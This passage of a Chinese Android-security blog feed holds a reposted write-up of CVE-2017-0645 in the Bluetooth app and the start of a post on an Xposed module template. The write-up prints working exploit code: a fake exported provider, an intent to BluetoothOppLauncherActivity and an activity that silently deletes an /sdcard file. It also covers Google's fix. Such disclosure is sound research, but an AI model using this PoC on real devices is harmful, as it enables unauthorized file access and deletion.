uri);</span><br><span class="line">        BluetoothOppUtility.updateVisibilityToHidden(context, uri);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Intent in = <span class="keyword">new</span> Intent(context, BluetoothOppTransferActivity.class);</span><br><span class="line">        in.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        in.setDataAndNormalize(uri);</span><br><span class="line">        context.startActivity(in);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在 openReceivedFile 函数中，我们看到蓝牙 App 最终将在授予读写权限后，启动能够处理 transInfo.mFileType 文件类型的某外部 App 的 Activity ，对 transInfo.mFileName 进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">openReceivedFile</span><span class="params">(Context context, String fileName, String mimetype,</span></span></span><br><span class="line"><span class="function"><span class="params">        Long timeStamp, Uri uri)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="keyword">null</span> || mimetype == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;ERROR: Para fileName ==null, or mimetype == null&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    File f = <span class="keyword">new</span> File(fileName); <span class="comment">//fileName可控</span></span><br><span class="line">    <span class="keyword">if</span> (!f.exists()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// skip</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// path受限于com.google.android.bluetooth.fileprovider使用的位置</span></span><br><span class="line"></span><br><span class="line">    Uri path = FileProvider.getUriForFile(context,</span><br><span class="line">                   <span class="string">&quot;com.google.android.bluetooth.fileprovider&quot;</span>, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there is no scheme, then it must be a file</span></span><br><span class="line">    <span class="keyword">if</span> (path.getScheme() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        path = Uri.fromFile(<span class="keyword">new</span> File(fileName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isRecognizedFileType(context, path, mimetype)) &#123;</span><br><span class="line">        Intent activityIntent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">        activityIntent.setDataAndTypeAndNormalize(path, mimetype);</span><br><span class="line"></span><br><span class="line">        List&lt;ResolveInfo&gt; resInfoList = context.getPackageManager()</span><br><span class="line">            .queryIntentActivities(activityIntent,</span><br><span class="line">                    PackageManager.MATCH_DEFAULT_ONLY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意这段，授予任何app对该文件的读写权限</span></span><br><span class="line">        <span class="comment">// Grant permissions for any app that can handle a file to access it</span></span><br><span class="line">        <span class="keyword">for</span> (ResolveInfo resolveInfo : resInfoList) &#123;</span><br><span class="line">            String packageName = resolveInfo.activityInfo.packageName;</span><br><span class="line">            context.grantUriPermission(packageName, path,</span><br><span class="line">                    Intent.FLAG_GRANT_WRITE_URI_PERMISSION |</span><br><span class="line">                    Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        <span class="comment">// 授予activity对该文件的读写权限</span></span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">        activityIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (V) Log.d(TAG, <span class="string">&quot;ACTION_VIEW intent sent out: &quot;</span> + path + <span class="string">&quot; / &quot;</span> + mimetype);</span><br><span class="line">            context.startActivity(activityIntent); </span><br></pre></td></tr></table></figure><p>由于 Intent 可控， Intent Data 可控， transInfo 可控，再加上启动的外部 App 被授予了读写权限，因此这里存在漏洞，我们可以伪造一个文件让蓝牙 App 启动某外部 App 打开，同时该外部 App 获得对伪造文件指向位置的读写权限。可惜此处伪造的文件位置受限于 com.android.bluetooth.filepovider ，其 file_paths.xml 使用的 external-path ，这意味着我们只能伪造一个外部存储 /sdcard 目录的文件。</p><h3 id="0x03-漏洞利用-1"><a href="#0x03-漏洞利用-1" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>漏洞利用可如下图所示，这种攻击发送 intent 的过程像极了飞去来器。恶意 App 发送 intent 过后,又回到了自己手中，但却获得了提权。</p><p>1.恶意 App 声明能对某种 filetype 进行处理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FakeViewActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">&quot;xxx/yyy&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.构造一个虚假的 bluetooth share provider——FakeBluetoothOppProvider ，传入 intent data 之中。主要内容可以参考 BluetoothOppProvider ，其 Uri 为</p><p>content://fake.bluetooth.provider/btopp/</p><p>并expose出来</p><p><provider            android:authorities="fake.bluetooth.provider"            android:name=".FakeBluetoothOppProvider"            android:exported="true" /></p><p>然后填入内容，指向 /sdcard 中某个已知文件，并传入 Intent data , 启动 BluetoothOppLauncherActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">m_btnTest.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">        intent.setAction(Constants.ACTION_OPEN);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;content://fake.bluetooth.provider/btopp/1&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">m_btnAddFakeEntry = (Button)findViewById(R.id.add);</span><br><span class="line">m_btnAddFakeEntry.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(BluetoothShare._ID, <span class="number">1</span>);</span><br><span class="line">        values.put(BluetoothShare.DIRECTION, BluetoothShare.DIRECTION_INBOUND);</span><br><span class="line">       values.put(BluetoothShare.TOTAL_BYTES, <span class="number">110000</span>);</span><br><span class="line">        values.put(BluetoothShare.CURRENT_BYTES,<span class="number">110000</span>);</span><br><span class="line">        values.put(BluetoothShare.TIMESTAMP, <span class="number">111111</span>);</span><br><span class="line">        values.put(BluetoothShare.DESTINATION, <span class="string">&quot;00:10:60:AA:36:F8&quot;</span>);</span><br><span class="line">        values.put(BluetoothShare._DATA, <span class="string">&quot;/storage/emulated/0/CVE-2016-6762.apk&quot;</span>);</span><br><span class="line">       values.put(BluetoothShare.MIMETYPE, <span class="string">&quot;xxx/yyy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        values.put(BluetoothShare.USER_CONFIRMATION, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// when content provider is null, use insert or use update</span></span><br><span class="line"></span><br><span class="line">        m_contentResolver.insert(BluetoothShare.CONTENT_URI, values);</span><br><span class="line">       <span class="comment">// m_contentResolver.update(BluetoothShare.CONTENT_URI, values, &quot;_id = 12&quot;, null);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3.蓝牙 App 取出我们构造的 filename, filetype；<br>4.蓝牙 App 授予读写权限，然后再启动恶意 App 进行处理;<br>5.恶意 App 直接删除 /sdcard 中的这个文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FakeViewActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> String TAG = <span class="string">&quot;Bluz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String dir = intent.getDataString();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;dir is &quot;</span>+dir);</span><br><span class="line">        Uri uri = intent.getData();</span><br><span class="line">        ContentResolver cr = getContentResolver();</span><br><span class="line">       Log.d(TAG, <span class="string">&quot;Deleting &quot;</span>+ intent.getDataString() +<span class="string">&quot; silently!&quot;</span>);</span><br><span class="line">        getContentResolver().delete(uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述整个过程中，恶意 App 并未申请 SD 卡写权限，因此这是一个提权漏洞。</p><p>另外还有一种利用方式，是在 Intent 中直接传入蓝牙 BluetoothOppProvider 的 uri ，比如 content://com.android.bluetooth.opp/btopp/1” ，从而获得对蓝牙共享数据库的读写权限。</p><p>完整代码请见<a href="https://github.com/heeeeen/CVE-PoC/tree/master/CVE-2017-0645">这里</a></p><h3 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h3><p>Google 对该漏洞的<a href="https://android.googlesource.com/platform/packages/apps/Bluetooth/+/14b7d7e1537af60b7bca6c7b9e55df0dc7c6bf41%5E%21/#F0">修复</a>主要有两点:</p><p>1.确保 Intent data 始终为 BluetoothOppProvider 的 Uri ，防止仿冒； 2.撤销了授予第三方应用的读写权限，只授予第三方应用某个 Activity 的读权限。</p><h3 id="0x05-时间线-1"><a href="#0x05-时间线-1" class="headerlink" title="0x05 时间线"></a>0x05 时间线</h3><pre><code>2017.02.15: 漏洞提交2017.03.01: 漏洞确认，初始评级为高2017.03.23: 漏洞降级为中2017.06.01: 补丁发布2017.06.23: 漏洞公开</code></pre>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;作者: heeeeen&lt;/p&gt;
&lt;p&gt;本文系转载，目的是学习，如有侵权，请联系删除&lt;/p&gt;
&lt;p&gt;转载出处:&lt;a href=&quot;http://www.ms509.com/&quot;&gt;http://www.ms509.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;蓝牙App漏洞系列分析之一CVE-2017-0601&quot;&gt;&lt;a href=&quot;#蓝牙App漏洞系列分析之一CVE-2017-0601&quot; class=&quot;headerlink&quot; title=&quot;蓝牙App漏洞系列分析之一CVE-2017-0601&quot;&gt;&lt;/a&gt;蓝牙App漏洞系列分析之一CVE-2017-0601&lt;/h2&gt;&lt;h3 id=&quot;0x01-概要&quot;&gt;&lt;a href=&quot;#0x01-概要&quot; class=&quot;headerlink&quot; title=&quot;0x01 概要&quot;&gt;&lt;/a&gt;0x01 概要&lt;/h3&gt;&lt;p&gt;2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CVE: CVE-2017-0601
BugID: A-35258579
严重性: 中
影响的Google设备: All
Updated AOSP versions: 7.0, 7.1.1, 7.1.2
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;0x02-漏洞分析&quot;&gt;&lt;a href=&quot;#0x02-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞分析&quot;&gt;&lt;/a&gt;0x02 漏洞分析&lt;/h3&gt;&lt;p&gt;蓝牙App暴露了一个广播接收器com.android.bluetooth.opp.BluetoothOppReceiver，本地普通App可以向这个Receiver发送广播，查看其OnReceive方法，包含了对多种传入广播Intent Action的处理，但是大多数Intent Action处于保护状态，简单用adb shell可以一一对其测试，比如&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>懒人福利-一秒创建Xposed模版</title>
    <link href="http://example.com/2018/10/01/%E6%87%92%E4%BA%BA%E7%A6%8F%E5%88%A9-%E4%B8%80%E7%A7%92%E5%88%9B%E5%BB%BAXposed%E6%A8%A1%E7%89%88/"/>
    <id>http://example.com/2018/10/01/%E6%87%92%E4%BA%BA%E7%A6%8F%E5%88%A9-%E4%B8%80%E7%A7%92%E5%88%9B%E5%BB%BAXposed%E6%A8%A1%E7%89%88/</id>
    <published>2018-10-01T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.207Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>###懒惰是科技的第一生产力</p></blockquote><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><ul><li>由于Android逆向每次想要使用Xposed进行Hook时，总是需要重复性地操作一遍Android Studio新建项目的流程.ps:当然可以只用一个项目，强迫症需要分开 ：）</li><li>由于Xposed实现的方式，每次修改hook代码后，需要重启机器，这也是白白浪费了很多时间。</li><li>基于以上两点，参考现有的方案，<strong>实现了一个Module,只需在AS中new一下即可解决问题</strong>。</li></ul><span id="more"></span><h3 id="0x01-创建XposedModule"><a href="#0x01-创建XposedModule" class="headerlink" title="0x01 创建XposedModule"></a>0x01 创建XposedModule</h3><p><strong>1.效果:</strong><br><img src="http://www.tasfa.cn/wordpress/wp-content/uploads/2018/04/2222.png" alt="效果图"></p><p><strong>2.代码结构:</strong></p><p><img src="http://www.tasfa.cn/wordpress/wp-content/uploads/2018/04/%E7%9B%AE%E5%BD%95%E6%A0%91.png" alt="目录树"></p><p><strong>3.代码解析:</strong></p><p>template.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">&lt;template</span><br><span class="line">    name=&quot;XposedModuleFreeRestart&quot;</span><br><span class="line">    description=&quot;Creates a new Xposed Module without restart&quot;</span><br><span class="line">    format=&quot;3&quot;</span><br><span class="line">    minApi=&quot;15&quot;</span><br><span class="line">    minBuildApi=&quot;15&quot;</span><br><span class="line">    revision=&quot;4&quot;&gt;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">value</span>=<span class="string">&quot;Other&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- parameter 主要是:效果图中，需要输入的几个设置栏 --&gt;</span></span><br><span class="line">    &lt;parameter</span><br><span class="line">        name=&quot;Xposed Mod class&quot;</span><br><span class="line">        constraints=&quot;nonempty|unique|class&quot;</span><br><span class="line">        default=&quot;XposedMod&quot;</span><br><span class="line">        help=&quot;Class that contains Xposed code&quot;</span><br><span class="line">        id=&quot;xposedModClass&quot;</span><br><span class="line">        type=&quot;string&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parameter</span><br><span class="line">        name=&quot;Xposed Description&quot;</span><br><span class="line">        constraints=&quot;nonempty&quot;</span><br><span class="line">        help=&quot;Description of Xposed Module&quot;</span><br><span class="line">        id=&quot;xposedDescription&quot;</span><br><span class="line">        type=&quot;string&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parameter</span><br><span class="line">        name=&quot;Package name&quot;</span><br><span class="line">        constraints=&quot;package&quot;</span><br><span class="line">        default=&quot;com.xxx.xxxx.xposed&quot;</span><br><span class="line">        id=&quot;packageName&quot;</span><br><span class="line">        type=&quot;string&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parameter</span><br><span class="line">        name=&quot;Hooked Package name&quot;</span><br><span class="line">        constraints=&quot;nonempty&quot;</span><br><span class="line">        default=&quot;com.xxxx.xxx.xposed&quot;</span><br><span class="line">        id=&quot;hookPackageName&quot;</span><br><span class="line">        type=&quot;string&quot;/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Module图标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thumbs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thumb</span>&gt;</span>template_xposed_module.png<span class="tag">&lt;/<span class="name">thumb</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thumbs</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 全局变量 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">globals</span> <span class="attr">file</span>=<span class="string">&quot;globals.xml.ftl&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 需要执行的操作 关键点--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">execute</span> <span class="attr">file</span>=<span class="string">&quot;recipe.xml.ftl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>recipe.xml.ftl</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">recipe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 创建文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">at</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(manifestOut)&#125;/assets/&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 移动合并文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">merge</span> <span class="attr">from</span>=<span class="string">&quot;AndroidManifest.xml.ftl&quot;</span> <span class="attr">to</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(manifestOut)&#125;/AndroidManifest.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">merge</span> <span class="attr">from</span>=<span class="string">&quot;build.gradle.ftl&quot;</span> <span class="attr">to</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(projectOut)&#125;/build.gradle&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">merge</span> <span class="attr">from</span>=<span class="string">&quot;res/values/strings.xml.ftl&quot;</span> <span class="attr">to</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(resOut)&#125;/values/strings.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 重命名文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">instantiate</span> <span class="attr">from</span>=<span class="string">&quot;assets/xposed_init.ftl&quot;</span> <span class="attr">to</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(manifestOut)&#125;/assets/xposed_init&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">instantiate</span> <span class="attr">from</span>=<span class="string">&quot;src/app_package/XposedMod.java.ftl&quot;</span> <span class="attr">to</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(srcOut)&#125;/$&#123;xposedModClass&#125;.java&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 打开文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">open</span> <span class="attr">file</span>=<span class="string">&quot;$&#123;escapeXmlAttribute(srcOut)&#125;/$&#123;xposedModClass&#125;.java&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">recipe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xposed_init.ftl 存储的是 Hook类的入口地址</p><p>strings.xml.ftl 存储的是 Xpodse模块的描述</p><p>XposedMod.java.ftl 创建后的模版代码，可以根据自己的需求，修改模版里面的代码</p><p>AndroidManifest.xml.ftl 主要是Xposed的meta字段</p><p>build.gradle.ftl 为空</p><p>4.bug修复：<br>由于Xposed会预先加载好jar包，因此，build.gradle中的implements需要修改为provided，才不会出现错误。</p><p>具体修改build.gradle.ftl,添加下面依赖:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    provided &#39;de.robv.android.xposed:api:82&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-加入免重启功能"><a href="#0x02-加入免重启功能" class="headerlink" title="0x02 加入免重启功能"></a>0x02 加入免重启功能</h3><ol><li><p>原理分析:原理这里不作多描述,实际上就是通过替换Xposed插件生成的APK，然后通过动态加载的方式来调用，以实现免重启的功能。具体可阅读参考文章。</p></li><li><p>改进：<br>对上面的AS模版进行改造，以实现免重启。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> $&#123;packageName&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dalvik.system.PathClassLoader;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 